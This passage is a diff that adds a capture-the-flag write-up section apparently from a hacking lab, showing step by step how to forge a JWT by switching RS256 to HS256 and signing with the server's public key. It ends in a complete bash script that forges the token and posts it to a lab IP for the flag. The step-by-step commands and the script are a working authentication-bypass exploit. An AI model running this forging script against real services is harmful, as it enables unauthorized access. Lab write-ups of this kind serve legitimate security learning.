@@ -114,3 +114,86 @@ Example
 Example
 
 # Task 14 - JWT - Challenge
+This challenge has you grab the JWT that exists on the front page in text form, as well as a public key that exists at public.pem.  With those items you are to exploit changing the ALG.
+
+* Grab the JWT
+    ```
+    body=$(curl --silent http://$ip)
+    ```
+    ```
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjEyNjQ4Mzk2LCJleHAiOjE2MTI2NDg1MTYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.UvzEJi_p45YXpHCZjgkN-R_S8rX7bLBzlTYfTnfmoScXNxYlqasUS6uATsmbqwZ1rOUhwR_I1Ow-lgF5j8q29Sw7YQetx-OsdQSMHIEMgsPhdU1EQ6RCSLF--wiK21ArEc6SCx3zOxLlMZV17IXUA2DRr9dR0S6RiQDwwqWMWWr1DrosDyvNoEjss6NCks4zTb9Ybv6oDiJ0AhOXXCNal93TSk3C1Zt1LR6wk50hnDnyDS0KbiTJNR611QLVzKHv_Z1Su9yDFBbGrUfyMOrIjqb1wCAQg6nuGYEkQi54zjm2A1eVVG8oO5owfZqip-MPbC8EUDff30Y9BftO-uU42w
+    ```
+* Extract the JWT from the body of the response
+    ```
+    jwt_body=$(echo $body | grep -o -P '(?<=JWT:\s).*(?=\s</xmp)')
+    ```
+* Extract the header from the JWT
+    ```
+    header=$(echo $jwt_body | cut -d"." -f1)
+    ```
+    ```
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9
+    ```
+* Extract the payload from the JWT
+    ```
+    payload=$(echo $jwt_body | cut -d"." -f2)
+    ```
+    ```
+    eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjEyNjQ4Mzk2LCJleHAiOjE2MTI2NDg1MTYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ
+    ```
+* Grab the public key
+    ```
+    key="$(curl --silent http://$ip/public.pem -O public.pem)"
+    ```
+* Decode the header
+    ```
+    decoded_header=$(echo $header | base64 -d)
+    ```
+* Replace RS256 with HS256
+    ```
+    new_header=$(echo $decoded_header | sed 's/RS/HS/g')
+    ```
+    ```
+    {"typ":"JWT","alg":"HS256"}
+    ```
+* Re-encode the header
+    ```
+    new_encoded_header=$(echo -n $new_header | base64)
+    ```
+    ```
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
+    ```
+* Join the new header and payload
+    ```
+    header_payload=$new_encoded_header.$payload
+    ```
+    ```
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjEyNjQ4Mzk2LCJleHAiOjE2MTI2NDg1MTYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ
+    ```
+* Create an HMAC using the public key against the new header and payload
+    ```
+    hmac=$(echo -n $header_payload | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat public.pem | xxd -p | tr -d "\\n") | cut -d" " -f2)
+    ```
+    ```
+    ac5cb767890bce8639795b961363c65b06ef0b562687b83e503a0990567b66f1
+    ```
+* Create a new secret
+    ```
+    secret=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$hmac')).replace('=','')\")")
+    ```
+* Create a new JWT using the newly encoded header, original payload, and the new secret derived from the HMAC
+    ```
+    new_jwt=$new_encoded_header.$payload.$secret
+    ```
+    ```
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjEyNjQ4Mzk2LCJleHAiOjE2MTI2NDg1MTYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.rFy3Z4kLzoY5eVuWE2PGWwbvC1Ymh7g-UDoJkFZ7ZvE
+    ```
+* Post the new JWT back to the application and receive the flag
+    ```
+    curl --silent -d "jwt=$new_jwt" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://$ip
+    ```
+
+Complete Bash script to grab the flag, just change the IP variable and you are good
+```
+ip="10.10.57.132"; body=$(curl --silent http://$ip); jwt_body=$(echo $body | grep -o -P '(?<=JWT:\s).*(?=\s</xmp)'); echo; echo "OLD JWT"; echo $jwt_body; header=$(echo $jwt_body | cut -d"." -f1); payload=$(echo $jwt_body | cut -d"." -f2); key="$(curl --silent http://$ip/public.pem -O public.pem)"; echo; echo "OLD HEADER"; echo $header; echo; decoded_header=$(echo $header | base64 -d); new_header=$(echo $decoded_header | sed 's/RS/HS/g'); echo "NEW ALG HEADER"; echo $new_header; echo; new_encoded_header=$(echo -n $new_header | base64); echo "NEW ALG HEADER ENCODED"; echo $new_encoded_header; echo; header_payload=$new_encoded_header.$payload; echo "NEW ALG HEADER + PAYLOAD"; echo $header_payload; echo; hmac=$(echo -n $header_payload | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat public.pem | xxd -p | tr -d "\\n") | cut -d" " -f2); echo "NEW HMAC"; echo $hmac; secret=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$hmac')).replace('=','')\")"); new_jwt=$new_encoded_header.$payload.$secret; echo; echo "NEW JWT"; echo $new_jwt; echo; echo "POSTING JWT"; curl --silent -d "jwt=$new_jwt" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://$ip
+```
